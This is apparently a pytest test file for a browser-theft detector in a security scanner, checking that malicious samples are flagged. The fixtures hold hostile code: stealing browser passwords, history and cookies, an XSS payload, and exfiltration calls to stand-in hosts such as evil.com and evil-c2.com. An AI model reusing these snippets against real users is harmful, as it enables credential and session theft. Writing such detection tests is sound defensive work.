"""Tests for the browser theft analyzer."""

import tempfile
from pathlib import Path

import pytest

from insect.analysis.browser_theft_analyzer import BrowserTheftAnalyzer
from insect.finding import FindingType, Severity


class TestBrowserTheftAnalyzer:
    """Test the browser theft analyzer."""

    @pytest.fixture
    def analyzer(self):
        """Create a browser theft analyzer for testing."""
        config = {
            "browser_theft": {
                "enable_browser_history_detection": True,
                "enable_browser_storage_detection": True,
                "enable_credential_detection": True,
                "enable_extension_detection": True,
            }
        }
        return BrowserTheftAnalyzer(config)

    def test_browser_history_file_access_detection(self, analyzer):
        """Test detection of browser history file access."""
        content = """
import sqlite3
import os

# Malicious code accessing browser history
def steal_browser_history():
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/History")
    firefox_path = os.path.expanduser("~/.mozilla/firefox/*/places.sqlite")

    conn = sqlite3.connect(chrome_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count FROM urls")

    return cursor.fetchall()
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find browser history access
            history_findings = [f for f in findings if "BROWSER_HISTORY_ACCESS" in f.id]
            assert len(history_findings) >= 1

            finding = history_findings[0]
            assert finding.severity == Severity.HIGH
            matched_text = finding.metadata["matched_text"].lower()
            assert "history" in matched_text or "places.sqlite" in matched_text

    def test_browser_profile_directory_access(self, analyzer):
        """Test detection of browser profile directory access."""
        content = """
import os
import shutil

def steal_browser_data():
    # Access Chrome user data
    chrome_profile = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/Default"
    )
    firefox_profile = os.path.expanduser("~/.mozilla/firefox/")

    # Copy browser profiles
    shutil.copytree(chrome_profile, "/tmp/stolen_chrome")
    shutil.copytree(firefox_profile, "/tmp/stolen_firefox")
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find browser profile access
            profile_findings = [f for f in findings if "BROWSER_PROFILE_PATH" in f.id]
            assert len(profile_findings) >= 1

            finding = profile_findings[0]
            assert finding.severity == Severity.HIGH
            matched_text = finding.metadata["matched_text"].lower()
            assert "chrome" in matched_text or "firefox" in matched_text

    def test_browser_password_extraction(self, analyzer):
        """Test detection of browser password extraction."""
        content = """
import win32crypt
import sqlite3
import json

def steal_chrome_passwords():
    # Access Chrome login data
    login_data_path = os.path.expanduser(
        "~/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    )

    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        encrypted_password = row[2]
        # Decrypt using CryptUnprotectData
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password)

    return passwords

def steal_firefox_passwords():
    # Access Firefox login data
    key4_db = os.path.expanduser("~/.mozilla/firefox/*/key4.db")
    logins_json = os.path.expanduser("~/.mozilla/firefox/*/logins.json")
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find password extraction attempts
            password_findings = [
                f for f in findings if "BROWSER_PASSWORD_EXTRACTION" in f.id
            ]
            assert len(password_findings) >= 1

            # Check if any finding has the expected keywords
            found_keywords = False
            for finding in password_findings:
                matched_text = finding.metadata["matched_text"].lower()
                keywords = [
                    "Login Data",
                    "key4.db",
                    "CryptUnprotectData",
                    "logins.json",
                ]
                if any(keyword.lower() in matched_text for keyword in keywords):
                    found_keywords = True
                    assert finding.severity == Severity.CRITICAL
                    break

            assert found_keywords, (
                f"No password findings contained expected keywords. "
                f"Found: {[f.metadata['matched_text'] for f in password_findings]}"
            )

    def test_browser_storage_manipulation(self, analyzer):
        """Test detection of browser storage manipulation (JavaScript)."""
        content = """
// Malicious JavaScript to steal localStorage data
function stealBrowserData() {
    var stolenData = {};

    // Steal localStorage
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        stolenData[key] = localStorage.getItem(key);
    }

    // Steal sessionStorage
    for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        stolenData[key] = sessionStorage.getItem(key);
    }

    // Access indexedDB
    var request = indexedDB.open("userDB", 1);

    return stolenData;
}
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find browser storage access
            storage_findings = [f for f in findings if "BROWSER_STORAGE_ACCESS" in f.id]
            assert len(storage_findings) >= 1

            finding = storage_findings[0]
            assert finding.severity == Severity.MEDIUM
            matched_text = finding.metadata["matched_text"].lower()
            keywords = ["localStorage", "sessionStorage", "indexedDB"]
            assert any(keyword.lower() in matched_text for keyword in keywords)

    def test_browser_session_hijacking(self, analyzer):
        """Test detection of browser session hijacking."""
        content = """
// Steal cookies and session tokens
function hijackSession() {
    // Get all cookies
    var cookies = document.cookie;

    // Look for session tokens
    var sessionToken = getCookie("JSESSIONID");
    var phpSession = getCookie("PHPSESSID");
    var aspSession = getCookie("ASP.NET_SessionId");

    // Send to attacker server
    fetch("http://malicious-server.com/steal", {
        method: "POST",
        body: JSON.stringify({
            cookies: cookies,
            tokens: {
                jsession: sessionToken,
                php: phpSession,
                asp: aspSession
            }
        })
    });
}

function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
}
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find session hijacking
            session_findings = [f for f in findings if "BROWSER_SESSION_HIJACK" in f.id]
            assert len(session_findings) >= 1

            # Check if any finding has the expected keywords
            found_keywords = False
            for finding in session_findings:
                matched_text = finding.metadata["matched_text"].lower()
                keywords = [
                    "document.cookie",
                    "JSESSIONID",
                    "PHPSESSID",
                    "ASP.NET_SessionId",
                ]
                if any(keyword.lower() in matched_text for keyword in keywords):
                    found_keywords = True
                    assert finding.severity == Severity.CRITICAL
                    break

            assert found_keywords, (
                f"No session findings contained expected keywords. "
                f"Found: {[f.metadata['matched_text'] for f in session_findings]}"
            )

    def test_xss_payload_detection(self, analyzer):
        """Test detection of XSS payloads for browser data theft."""
        content = """
<script>
    // XSS payload to steal browser data
    var stolen = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    // Exfiltrate data
    var img = new Image();
    img.src = "http://evil.com/steal?data=" + btoa(JSON.stringify(stolen));
</script>

<script>document.cookie + localStorage.getItem("token")</script>
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find XSS payload
            xss_findings = [f for f in findings if "BROWSER_XSS_PAYLOAD" in f.id]
            assert len(xss_findings) >= 1

            finding = xss_findings[0]
            assert finding.severity == Severity.HIGH
            assert finding.type == FindingType.VULNERABILITY

    def test_browser_extension_manipulation(self, analyzer):
        """Test detection of browser extension manipulation."""
        content = """
// Malicious extension injection
function injectMaliciousExtension() {
    // Access Chrome extension APIs
    if (chrome.extension) {
        chrome.extension.sendMessage({type: "steal_data"});
    }

    // Manipulate extensions directory
    var extensionsPath = "~/Library/Application Support/Google/Chrome/Default/"
                       + "Extensions/";

    // Install malicious extension
    chrome.management.install({
        url: "http://malicious-site.com/evil-extension.crx"
    });
}

// Firefox extension manipulation
browser.extension.getURL("manifest.json");
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find extension manipulation
            extension_findings = [
                f for f in findings if "BROWSER_EXTENSION_INJECT" in f.id
            ]
            assert len(extension_findings) >= 1

            finding = extension_findings[0]
            assert finding.severity == Severity.HIGH
            matched_text = finding.metadata["matched_text"].lower()
            keywords = [
                "chrome.extension",
                "browser.extension",
                "Extensions",
                "manifest.json",
            ]
            assert any(keyword.lower() in matched_text for keyword in keywords)

    def test_browser_data_exfiltration(self, analyzer):
        """Test detection of browser data exfiltration."""
        content = """
import requests
import json

def exfiltrate_browser_data():
    # Collect stolen browser data
    stolen_data = {
        "cookies": get_stolen_cookies(),
        "history": get_stolen_history(),
        "passwords": get_stolen_passwords(),
        "tokens": get_stolen_tokens()
    }

    # Send to command & control server
    response = requests.post("http://evil-c2.com/collect",
                           data=json.dumps(stolen_data),
                           headers={"Content-Type": "application/json"})

    # Also use urllib for redundancy
    urllib.request.urlopen("http://backup-c2.com/data",
                          data=json.dumps(stolen_data).encode())

async function exfiltrateJS() {
    const data = {
        cookies: document.cookie,
        credentials: await getStoredCredentials()
    };

    fetch("http://evil.com/steal", {
        method: "POST",
        body: JSON.stringify(data)
    });
}
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find data exfiltration
            exfil_findings = [
                f for f in findings if "BROWSER_DATA_EXFILTRATION" in f.id
            ]
            assert len(exfil_findings) >= 1

            finding = exfil_findings[0]
            assert finding.severity == Severity.CRITICAL

    def test_browser_automation_abuse(self, analyzer):
        """Test detection of browser automation tool abuse."""
        content = '''
from selenium import webdriver
from selenium.webdriver.common.by import By
import json

def steal_with_automation():
    # Start headless Chrome
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--user-data-dir=/path/to/user/profile")

    driver = webdriver.Chrome(options=options)

    # Navigate to banking site with saved credentials
    driver.get("https://bank.com/login")

    # Extract saved passwords from the browser
    driver.execute_script("""
        var passwords = [];
        var inputs = document.querySelectorAll('input[type="password"]');
        inputs.forEach(function(input) {
            passwords.push(input.value);
        });
        return passwords;
    """)

    # Steal localStorage data
    local_storage = driver.execute_script("return JSON.stringify(localStorage);")

    # Steal cookies
    cookies = driver.get_cookies()

    driver.quit()
    return {"passwords": passwords, "localStorage": local_storage, "cookies": cookies}
        '''

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find automation abuse
            automation_findings = [
                f for f in findings if "BROWSER_AUTOMATION_ABUSE" in f.id
            ]
            assert len(automation_findings) >= 1

            finding = automation_findings[0]
            assert finding.severity == Severity.MEDIUM

    def test_browser_cache_access(self, analyzer):
        """Test detection of browser cache access."""
        content = """
import os
import shutil

def steal_browser_cache():
    # Access Chrome cache
    chrome_cache = os.path.expanduser("~/Library/Caches/Google/Chrome/Default/Cache")

    # Access Firefox cache
    firefox_cache = os.path.expanduser("~/Library/Caches/Firefox/Profiles/*/cache2")

    # Copy cache files
    shutil.copytree(chrome_cache, "/tmp/stolen_cache/chrome")
    shutil.copytree(firefox_cache, "/tmp/stolen_cache/firefox")
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find cache access
            cache_findings = [f for f in findings if "BROWSER_CACHE_ACCESS" in f.id]
            assert len(cache_findings) >= 1

            finding = cache_findings[0]
            assert finding.severity == Severity.MEDIUM

    def test_form_data_theft(self, analyzer):
        """Test detection of browser form data theft."""
        content = """
// Steal autofill and form data
function stealFormData() {
    // Access autofill data
    var autofillData = getAutofillData();

    // Steal saved form values
    var forms = document.querySelectorAll('form');
    var formData = {};

    forms.forEach(function(form) {
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input) {
            if (input.value && (input.type === 'text' || input.type === 'email')) {
                formData[input.name] = input.value;
            }
        });
    });

    // Look for credit card data
    var creditCardInputs = document.querySelectorAll('input[autocomplete*="cc-"]');
    var paymentInfo = {};

    creditCardInputs.forEach(function(input) {
        paymentInfo[input.autocomplete] = input.value;
    });

    return {
        autofill: autofillData,
        forms: formData,
        payment: paymentInfo
    };
}
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should find form data theft
            form_findings = [f for f in findings if "BROWSER_FORM_DATA_THEFT" in f.id]
            assert len(form_findings) >= 1

            finding = form_findings[0]
            assert finding.severity == Severity.HIGH

    def test_configuration_options(self):
        """Test different configuration options."""
        # Test with disabled browser history detection
        config_no_history = {
            "browser_theft": {
                "enable_browser_history_detection": False,
                "enable_browser_storage_detection": True,
                "enable_credential_detection": True,
                "enable_extension_detection": True,
            }
        }
        analyzer_no_history = BrowserTheftAnalyzer(config_no_history)

        content = """
        chrome_path = "~/.config/google-chrome/Default/History"
        localStorage.getItem("token")
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer_no_history.analyze_file(Path(f.name))

            # Should not find browser history patterns
            history_findings = [f for f in findings if "BROWSER_HISTORY_ACCESS" in f.id]
            assert len(history_findings) == 0

            # Should still find storage patterns
            storage_findings = [f for f in findings if "BROWSER_STORAGE_ACCESS" in f.id]
            assert len(storage_findings) >= 1

    def test_false_positive_reduction(self, analyzer):
        """Test that legitimate browser API usage doesn't trigger false positives."""
        content = """
// Legitimate browser API usage
function saveUserPreferences() {
    // Save user settings to localStorage (legitimate use)
    localStorage.setItem("theme", "dark");
    localStorage.setItem("language", "en");

    // Get user preferences (legitimate use)
    var theme = localStorage.getItem("theme");
    var lang = localStorage.getItem("language");

    return {theme: theme, language: lang};
}

// Legitimate cookie usage
function setAuthCookie() {
    // Set authentication cookie (legitimate)
    document.cookie = "auth_token=abc123; path=/; secure; httponly";
}
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should still detect some patterns but with appropriate context
            # The analyzer detects patterns but severity should reflect context
            storage_findings = [f for f in findings if "BROWSER_STORAGE_ACCESS" in f.id]
            session_findings = [f for f in findings if "BROWSER_SESSION_HIJACK" in f.id]

            # These are detected but should be reviewed in context
            # May or may not detect depending on pattern specificity
            assert len(storage_findings) >= 0
            # May or may not detect depending on pattern specificity
            assert len(session_findings) >= 0

    def test_multiple_file_types(self, analyzer):
        """Test detection across different file types."""
        test_cases = [
            (".py", 'history_path = "~/.config/google-chrome/Default/History"'),
            (".js", "var cookies = document.cookie;"),
            (".ts", 'const storage = localStorage.getItem("token");'),
            (".sh", "cp ~/.mozilla/firefox/*/places.sqlite /tmp/"),
            (".php", '$cookies = $_COOKIE["PHPSESSID"];'),
        ]

        total_findings = 0

        for suffix, content in test_cases:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=suffix, delete=False
            ) as f:
                f.write(content)
                f.flush()

                findings = analyzer.analyze_file(Path(f.name))
                total_findings += len(findings)

        # Should find some browser theft patterns across different file types
        assert total_findings >= 2

    def test_can_analyze_file(self, analyzer):
        """Test file analysis capability detection."""
        # Should analyze various file types
        assert analyzer.can_analyze_file(Path("script.py"))
        assert analyzer.can_analyze_file(Path("app.js"))
        assert analyzer.can_analyze_file(Path("component.tsx"))
        assert analyzer.can_analyze_file(Path("script.sh"))
        assert analyzer.can_analyze_file(Path("app.php"))
        assert analyzer.can_analyze_file(Path("main.go"))

        # Should not analyze unsupported files
        assert not analyzer.can_analyze_file(Path("image.png"))
        assert not analyzer.can_analyze_file(Path("document.pdf"))
        assert not analyzer.can_analyze_file(Path("archive.zip"))

    def test_remediation_advice(self, analyzer):
        """Test that findings include appropriate remediation advice."""
        content = """
        login_data_path = "~/Chrome/Default/Login Data"
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            # Should have findings with remediation advice
            assert len(findings) >= 1

            for finding in findings:
                assert finding.remediation is not None
                assert len(finding.remediation) > 10  # Should have meaningful advice
                assert any(
                    keyword in finding.remediation.lower()
                    for keyword in ["remove", "avoid", "implement", "use", "ensure"]
                )

    def test_metadata_and_tags(self, analyzer):
        """Test that findings include proper metadata and tags."""
        content = """
        chrome_history = "~/.config/google-chrome/Default/History"
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(content)
            f.flush()

            findings = analyzer.analyze_file(Path(f.name))

            assert len(findings) >= 1

            finding = findings[0]

            # Check metadata
            assert "matched_text" in finding.metadata
            assert "pattern_id" in finding.metadata
            assert "context" in finding.metadata

            # Check tags
            assert "browser" in finding.tags
            assert "theft" in finding.tags
            assert "privacy" in finding.tags
            assert "security" in finding.tags

            # Check other properties
            assert finding.confidence > 0.5
            assert finding.references is not None
            assert len(finding.references) > 0
